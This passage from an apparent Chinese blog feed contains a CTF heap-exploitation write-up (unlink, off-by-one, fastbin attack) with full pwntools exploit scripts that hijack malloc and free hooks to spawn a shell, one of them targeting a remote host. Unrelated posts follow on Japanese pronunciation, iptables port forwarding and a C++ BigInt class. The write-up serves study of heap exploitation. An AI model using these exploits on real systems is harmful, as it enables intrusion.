bD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/03/04/Oke9bMgGQ7tf45J.png" alt="Snipaste_2020-03-04_11-45-08.png"></p><p>然后再通过 List 修改自身，使其指向 got 表即可。</p><p>总结：其实 next_chunk 只起到了触发 unlink 的作用，并且协助检测了 fake_chunk 的合法性，在 unlink 的修改过程中， next_chunk 没有参与，至于 unlink 之后的堆块合并过程，也不是我们的关注点了。</p><p><a href="https://bbs.pediy.com/thread-253502.htm" target="_blank" rel="noopener">参考资料</a></p><p><a href="/uploads/Annevi.7z">Annevi</a></p><p>这道题和上面一道题类似，不过</p><ol><li>限制了堆块的最小 size：0x144，即不能使用 fastbin attack。</li><li>增加了 edit 功能，可以对堆块进行修改</li><li>用一个数组对每个堆块的使用状况进行检查，我们不能对 free_chunk 进行 delete、show 操作</li></ol><p>这个对 libc 的获取并不会产生影响，我们同样的 malloc 一个 small_chunk，在之后 free 掉，然后 <strong>重新申请该堆块，并且写入’\n’</strong> （这样就成功绕过了堆块状态的检测，同时只损失了 main_arena + offset 的最低位，而 main_arena 的最低位一定是 0x00，所以没有任何影响），成功获取 libc 地址。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./annevi'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./annevi'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, text = <span class="string">'aa'</span>)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">':'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'size?'</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'content:'</span>, text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">':'</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index?'</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">':'</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index?'</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, text = <span class="string">'bb'</span>)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">':'</span>,<span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index?'</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'content:'</span>, text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x90</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x90</span>, <span class="string">''</span>)</span><br><span class="line">show(<span class="number">0</span>)  <span class="comment">#leak the addr of main_arena</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">malloc_hook_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00e'</span>) - <span class="number">0xa</span> + <span class="number">0x10</span> </span><br><span class="line"><span class="comment"># must be careful, cause the lowest byte has been changed</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">'malloc_hook_addr = '</span> + hex(malloc_hook_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = LibcSearcher('__malloc_hook', malloc_hook_addr)</span></span><br><span class="line"><span class="comment">#libc_base = malloc_hook_addr - libc.dump('__malloc_hook')</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">libc_base = malloc_hook_addr - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">payload1 = p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(<span class="number">0x602048</span><span class="number">-0x18</span>) + p64(<span class="number">0x602048</span> - <span class="number">0x10</span>) + <span class="string">'\x00'</span> * <span class="number">0x70</span> + p64(<span class="number">0x90</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line"><span class="comment"># make a fake_chunk and its fake_fd, fake_bk as well as next chunk's presize, size</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, payload1)</span><br><span class="line">dele(<span class="number">2</span>) <span class="comment"># unlink</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'\x00'</span>*<span class="number">0x18</span> + p64(libc_base + libc.symbols[<span class="string">'__free_hook'</span>])  <span class="comment"># edit the addr of list[1]</span></span><br><span class="line">edit(<span class="number">1</span>, payload2)</span><br><span class="line">edit(<span class="number">1</span>, p64(libc_base + libc.symbols[<span class="string">'system'</span>])) <span class="comment"># edit got</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>) <span class="comment"># free('/bin/sh')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1>off by one</h1><p>off by one 就是利用系统对非法内存的一个字节的修改来达到任意地址修改的目的。</p><p>对非法内存的修改情况可能有：</p><ol><li>人为失误，将 for(int a = 0; a &lt; 5; a++) 这类循环的小于符号写成了小于等于，导致多写。</li><li>自带库的特性，比如 c语言中字符串的结尾必须是 ‘/x00’，一些库函数对末尾赋零时可能会超出字符串内存范围。</li></ol><p><a href="/uploads/E99.7z">E99</a></p><p>题目也与上面的类似，不过多了 edit 堆块大小的限制，必须在<strong>申请的堆块大小范围之内</strong>。</p><p>这里讨论的是人为失误， 本题的 read_n 函数边界条件错误，使得我们可以通过多修改一个字节来达到修改 next_chunk 的 size。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">read_n</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, (<span class="keyword">void</span> *)(i + a1), <span class="number">1u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(i + a1) == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总体思路：</p><p>创建三个堆块，其中第二个堆块必须是 fast_chunk，在修改第一个堆块的过程中，利用 <strong>off_by_one</strong> 的溢出漏洞修改下一个堆块的 size，使其大小能够覆盖第三个堆块（便于修改），然后将<strong>第二个</strong>和<strong>第三个</strong>堆块 free 掉。</p><p>这样 unsorted bin 和 fast bin 就有了相关的指针，然后我们再重新利用 add 功能先申请到第二个堆块 <strong>small_chunk</strong>（从 unsorted bin）。</p><p>现在我们就拥有了 第二个和第三个堆块的完整控制权，<strong>也绕过了 edit 函数的 size 限制</strong>，然后我们就可以进行 <strong>fastbin attack</strong> 了，改掉 fast_chunk 的 fd， 再新申请<strong>堆块三</strong>，下一次申请 fast_chunk 时，就可以指定位置修改内存了（注意在这里构造 payload 还是需要寻找目标地址<strong>前面 size 刚好符合</strong>的位置）。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8 </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary_name = <span class="string">'e99'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">        cn = process(<span class="string">'./'</span>+binary_name)</span><br><span class="line">        libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">        <span class="comment">#libc = ELF('/lib/i386-linux-gnu/libc-2.23.so',checksec=False)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">        cn = remote(<span class="string">'47.103.214.163'</span>,<span class="number">20302</span>)</span><br><span class="line">        libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x : cn.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x : cn.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : cn.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> x : cn.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x : cn.recv(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b : cn.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b : cn.sendlineafter(a,b)</span><br><span class="line">ia = <span class="keyword">lambda</span> : cn.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bin = ELF(<span class="string">'./'</span>+binary_name,checksec=<span class="literal">False</span>)</span><br><span class="line">one1=<span class="number">0x45216</span></span><br><span class="line"><span class="comment">#execve("/bin/sh", rsp+0x30, environ) rax == NULL</span></span><br><span class="line"></span><br><span class="line">one2=<span class="number">0x4526a</span></span><br><span class="line"><span class="comment">#execve("/bin/sh", rsp+0x30, environ) [rsp+0x30] == NULL'''</span></span><br><span class="line"></span><br><span class="line">one3=<span class="number">0xf02a4</span></span><br><span class="line"><span class="comment">#execve("/bin/sh", rsp+0x50, environ) [rsp+0x50] == NULL'''</span></span><br><span class="line"></span><br><span class="line">one4=<span class="number">0xf1147</span></span><br><span class="line"><span class="comment">#execve("/bin/sh", rsp+0x70, environ) [rsp+0x70] == NULL'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(a=<span class="string">''</span>)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> local:</span><br><span class="line">                gdb.attach(cn,a)</span><br><span class="line">        <span class="keyword">if</span> a == <span class="string">''</span>:</span><br><span class="line">                raw_input()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(sz,con=<span class="string">'aa'</span>)</span>:</span></span><br><span class="line">        sla(<span class="string">':'</span>,<span class="string">'1'</span>)</span><br><span class="line">        sla(<span class="string">'size?'</span>,str(sz))</span><br><span class="line">        sla(<span class="string">'content:'</span>,con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">        sla(<span class="string">':'</span>,<span class="string">'3'</span>)</span><br><span class="line">        sla(<span class="string">'index?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,con)</span>:</span></span><br><span class="line">        sla(<span class="string">':'</span>,<span class="string">'4'</span>)</span><br><span class="line">        sla(<span class="string">'index?'</span>,str(idx))</span><br><span class="line">        sa(<span class="string">'content:'</span>,con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">        sla(<span class="string">':'</span>,<span class="string">'2'</span>)</span><br><span class="line">        sla(<span class="string">'index?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># chunk0</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># chunk1</span></span><br><span class="line">add(<span class="number">0x78</span>) <span class="comment"># chunk2</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># chunk3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#add(0x88,'/bin/sh')</span></span><br><span class="line">dele(<span class="number">0</span>) </span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">''</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">cn.recvuntil(<span class="string">"content:"</span>)</span><br><span class="line">lbase=u64(cn.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)-libc.sym[<span class="string">'__malloc_hook'</span>]+<span class="number">6</span></span><br><span class="line">success(<span class="string">'libc:'</span>+hex(lbase))  <span class="comment"># leak libc base</span></span><br><span class="line"></span><br><span class="line">pay=<span class="string">'\x00'</span>*<span class="number">0x88</span>+<span class="string">'\xf1'</span> <span class="comment"># off_by_one create a fake chunk with size 0xf1</span></span><br><span class="line">edit(<span class="number">1</span>,pay)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)   <span class="comment"># put the fake_chunk into unsorted bin</span></span><br><span class="line">dele(<span class="number">3</span>)   <span class="comment"># put fast_chunk into fast bin</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay2=<span class="string">'\x00'</span>*<span class="number">0x78</span>+p64(<span class="number">0x71</span>)+p64(lbase+libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)</span><br><span class="line">add(<span class="number">0xd8</span>,pay2)  <span class="comment"># fastbin attack</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)  <span class="comment"># padding</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">19</span>+p64(lbase+one4)) <span class="comment"># change got</span></span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">sl(<span class="string">'1'</span>) <span class="comment"># getshell</span></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="write-up" scheme="https://mrh1s.top/categories/write-up/"/>
    
      <category term="hgame20200201" scheme="https://mrh1s.top/categories/write-up/hgame20200201/"/>
    
    
      <category term="pwn_heap" scheme="https://mrh1s.top/tags/pwn-heap/"/>
    
  </entry>
  
  <entry>
    <title>あなた为何读作“a na da”?</title>
    <link href="https://mrh1s.top/posts/ebc3a077/"/>
    <id>https://mrh1s.top/posts/ebc3a077/</id>
    <published>2020-01-20T03:45:01.000Z</published>
    <updated>2020-01-20T05:17:33.537Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="疑问">疑问</h2><p>我们在看动漫以及日剧的时候，常会见到以下表达：</p><blockquote><p>あなた(ta)　大好き(ki)　がんばて(te)</p></blockquote><p>我们可以看到这几个词的词尾都是未浊化的</p><p>但是在发音时却听到了：</p><blockquote><p>“anada”       “daisugi”       “ganbade”</p></blockquote><p>就拿这个 <strong>あなた(ta)</strong> 为例，到底我们是应该读 <strong>た</strong> 还是 <strong>だ</strong> ？</p><h2 id="解释">解释</h2><h3 id="中文">中文</h3><p>回到中文发音上面来</p><p>「b」跟「p」  他们差在哪里？</p><p>「b」「p」 差在一个有送气一个没送气</p><p>「b」是没有送气/送气比较少的</p><p>所以中文是用<code>有没有送气</code>来决定意思</p><h3 id="日文">日文</h3><p>其实，有没有出气在日文当中是没关系的</p><p>日文重视<code>「声」</code>这里，要<code>「振动声带」</code>，才是标准的日文</p><p>日本人是用 <strong>「振动声带」</strong> 来感觉</p><p>我们在念「が」「ぎ」「ぐ」「げ」「ご」 的时候</p><p>可以用手摸一下自己的喉咙，能感受到明显的<strong>声带振动</strong></p><p>而「か」「き」「く」「け」「こ」</p><p>则<strong>感受不到</strong>声带的<strong>震动</strong></p><blockquote><p>为什么没有人念「あなた(ta)」？</p></blockquote><p>为什么没有人念「あなた(ta)」？其实很简单</p><p>「た(ta)」这个音只要在单字的第二个音以下</p><p>因为日本人念第一个音时，气就吐完了</p><p>当他念「あ」的时候就把气吐完了</p><p>所以只要是第一个音以后就不会有气</p><p>你听起来就像浊音因为它不送气了</p><p>所以听起来就好像是浊音</p><p>这种发音在日文中叫做<code>不送气音</code></p><h2 id="参考资料">参考资料</h2><p><a href="https://www.youtube.com/watch?v=PiiHIykLFlU" target="_blank" rel="noopener">https://www.youtube.com/watch?v=PiiHIykLFlU</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="notes" scheme="https://mrh1s.top/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>利用iptables配置Minecraft跳板机</title>
    <link href="https://mrh1s.top/posts/d0aeeace/"/>
    <id>https://mrh1s.top/posts/d0aeeace/</id>
    <published>2020-01-14T08:09:55.000Z</published>
    <updated>2020-01-20T03:43:11.018Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Introduction">Introduction</h2><h3 id="Servers">Servers</h3><p>搬瓦工的 <strong>CN2 GT</strong> 服务器 <strong>S1</strong>（2g 2core）</p><p><strong>CN2 GIA</strong> 服务器 <strong>S2</strong>（0.5g 1core）</p><p>阿里云服务器 <strong>S3</strong></p><h3 id="need">need</h3><p>我拥有三台服务器，其中需要使用 <strong>S1</strong> 开服，但是由于<strong>线路原因</strong>，游戏丢包情况十分严重，相比之下配置较低的 <strong>cn2 gia</strong> 服务器就拥有很优质的线路，且 <strong>S2</strong> 还不够，仍然会有少许丢包，导致mc掉线，故再加上阿里云服务器 <strong>S3</strong> 进行中转，通过利用 <strong>S2</strong> 和 <strong>S3</strong> 作为跳板机对流量进行中转，便可以达到较佳的游戏体验。</p><h3 id="graph">graph</h3><p><strong>mc客户端</strong> &lt;------&gt; <strong>阿里云</strong> S3 &lt;------&gt; <strong>cn2 gia 服务器</strong> S2 &lt;------&gt; <strong>mc服务器</strong> S1</p><h2 id="Configuration">Configuration</h2><p>参考资料：<a href="http://jensd.be/343/linux/forward-a-tcp-port-to-another-ip-or-port-using-nat-with-iptables" target="_blank" rel="noopener">nat-with-iptables</a></p><h3 id="ip-forward">ip_forward</h3><p>服务器的流量转发功能默认关闭，需要手动开启</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysctl net.ipv4.ip_forward <span class="comment"># CentOS or Ubuntu</span></span><br></pre></td></tr></table></figure><blockquote><p>net.ipv4.ip_forward = 0 #表明未开启流量转发</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">echo</span> <span class="string">"net.ipv4.ip_forward = 1"</span>|sudo tee /etc/sysctl.d/99-ipforward.conf</span><br><span class="line">net.ipv4.ip_forward = 1 </span><br><span class="line"><span class="comment"># CentOS</span></span><br><span class="line"></span><br><span class="line">sudo sed -i <span class="string">'s/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g'</span> /etc/sysctl.conf</span><br><span class="line"><span class="comment"># Ubuntu</span></span><br></pre></td></tr></table></figure><p>便可以开启转发，但重启后会恢复，我们需要将其写入配置</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysctl -p /etc/sysctl.d/99-ipforward.conf</span><br><span class="line"><span class="comment"># CentOS</span></span><br><span class="line"></span><br><span class="line">sudo sysctl -p</span><br><span class="line"><span class="comment"># Ubuntu</span></span><br></pre></td></tr></table></figure><blockquote><p>net.ipv4.ip_forward = 1 # 写入配置</p></blockquote><h3 id="iptables">iptables</h3><h4 id="install-start">install &amp; start</h4><ol><li>对于 <strong>Ubuntu</strong> 系统，自带 <strong>iptables</strong></li><li>对于 <strong>CentOS</strong> 系统，默认安装了 <strong>firewall</strong> ，需要先将 <strong>firewall</strong> 关闭，再安装 <strong>iptables</strong></li></ol><p>参考此文章：<a href="https://blog.csdn.net/mshxuyi/article/details/93979737" target="_blank" rel="noopener">centos如何开启iptables</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld.service <span class="comment"># 停止firewall</span></span><br><span class="line">systemctl <span class="built_in">disable</span> firewalld.service <span class="comment"># 禁止firewall开机启动</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># yum -y install iptables-services 安装iptables(有的系统不需安装，视情况而定)</span></span><br><span class="line">service iptables start <span class="comment"># 启动iptables</span></span><br></pre></td></tr></table></figure><h4 id="Configuration-2">Configuration</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo iptables -F</span><br><span class="line">sudo iptables -t nat -F</span><br><span class="line"><span class="comment"># 清除iptables原有的配置文件</span></span><br></pre></td></tr></table></figure><p>流量转发配置</p><p>自行替换 <strong>Gateway_IP</strong>、<strong>Gateway_Port</strong>、<strong>Dest_IP</strong>、<strong>Dest_Port</strong></p><p>分别对应 跳板机的ip和端口，目标机器的ip和端口</p><p>这里的<strong>协议</strong>我设置为了 <strong>tcp</strong>， 根据你需要转发的协议类型进行设置</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo iptables -t nat -A PREROUTING -p tcp --dport Gateway_Port -j DNAT --to-destination Dest_IP:Dest_PORT <span class="comment"># 将进入跳板机的流量转发到目标ip</span></span><br><span class="line"></span><br><span class="line">sudo iptables -t nat -A POSTROUTING -p tcp -d Dest_IP --dport Dest_Port -j SNAT --to-source Gateway_ip <span class="comment"># 将目标ip返回的流量转发给原ip</span></span><br><span class="line"></span><br><span class="line">sudo iptables -t nat -L -n <span class="comment"># 查看iptables配置情况</span></span><br></pre></td></tr></table></figure><p>查看配置无误之后，即完成</p><p>若希望保存配置</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service iptables save</span><br><span class="line"><span class="comment"># CentOS</span></span><br><span class="line"></span><br><span class="line">sudo iptables-save | sudo tee /etc/iptables.up.rules</span><br><span class="line"><span class="comment"># Ubuntu</span></span><br></pre></td></tr></table></figure><blockquote><p>iptables: Saving firewall rules to /etc/sysconfig/iptables:[  OK  ]</p></blockquote><h3 id="Q-A">Q&amp;A</h3><h4 id="1-阿里云无法转发">1. 阿里云无法转发</h4><p>阿里云采用了 <a href="http://www.360doc.com/content/18/1127/11/60700377_797529851.shtml" target="_blank" rel="noopener">弹性ip</a> 的技术， 即在你访问其公网ip之后又经过一层nat，转发到内网</p><p>所以我们的 <strong>iptables</strong> 配置也应该将本机ip修改为内网ip</p><p>这时我们的 <strong>Gateway_IP</strong> 应该填写内网ip， 即 172 . 17. * . *  （具体请自行查询）</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@izuf6eyc1ac8d7lj4j6q2oz /]<span class="comment"># ifconfig</span></span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.*.*  netmask 255.255.192.0  broadcast 172.17.*.*</span><br><span class="line">        ether 00:16:3e:10:91:52  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 3528831  bytes 368948380 (351.8 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 3485951  bytes 321121112 (306.2 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        loop  txqueuelen 1  (Local Loopback)</span><br><span class="line">        RX packets 6260  bytes 392377 (383.1 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 6260  bytes 392377 (383.1 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><h4 id="2-多层跳板如何搭建">2. 多层跳板如何搭建</h4><p>多层跳板，就是将跳板机 <strong>src</strong> 的 <strong>目的地址</strong> 设置为下级跳板 <strong>dest</strong> ，层层中转即可</p><p>即配置 <strong>S1 、 S2</strong></p><ol><li><p>使 <strong>S3</strong> 中转给 <strong>S2</strong></p></li><li><p>使 <strong>S2</strong> 中转给 <strong>S1</strong></p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tips" scheme="https://mrh1s.top/categories/Tips/"/>
    
    
  </entry>
  
  <entry>
    <title>大整数的C++实现</title>
    <link href="https://mrh1s.top/posts/ab908eac/"/>
    <id>https://mrh1s.top/posts/ab908eac/</id>
    <published>2020-01-06T04:20:31.000Z</published>
    <updated>2020-01-06T04:44:19.992Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>Big Int</h1><p>已经上传 <strong>github</strong> ：<a href="https://github.com/mrh929/BigInt" target="_blank" rel="noopener">https://github.com/mrh929/BigInt</a></p><h2 id="Introduction">Introduction</h2><p>一个用C++编写的大整数运算器，使用了类的方法以及符号重载的方式来管理各种计算符号。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">ostream &amp; <span class="keyword">operator</span> &lt;&lt; (ostream &amp;os, BigInt a);<span class="comment">//重载输出流</span></span><br><span class="line">BigInt <span class="keyword">operator</span> &lt;&lt; (BigInt a, <span class="keyword">int</span> b);<span class="comment">//以下是各种符号的符号重载</span></span><br><span class="line">BigInt <span class="keyword">operator</span> &gt;&gt; (BigInt a, <span class="keyword">int</span> b);</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &gt; (BigInt a, BigInt b);</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &gt;= (BigInt a, BigInt b);</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (BigInt a, BigInt b);</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &lt;= (BigInt a, BigInt b);</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> == (BigInt a, BigInt b);</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> != (BigInt a, BigInt b);</span><br><span class="line">BigInt <span class="keyword">operator</span> + (BigInt a, BigInt b);</span><br><span class="line">BigInt <span class="keyword">operator</span> - (BigInt a, BigInt b);</span><br><span class="line">BigInt <span class="keyword">operator</span> * (BigInt a, BigInt b);</span><br><span class="line">BigInt <span class="keyword">operator</span> / (BigInt a, BigInt b);</span><br><span class="line">BigInt <span class="keyword">operator</span> % (BigInt a, BigInt b);</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">absolute_cmp</span><span class="params">(BigInt a, BigInt b)</span></span>;<span class="comment">//绝对值比较</span></span><br><span class="line"><span class="function">BigInt <span class="title">pushup</span><span class="params">(BigInt &amp;a)</span></span>;<span class="comment">//进位函数，方便更新处理加法和乘法之后的结果</span></span><br><span class="line"><span class="function">BigInt <span 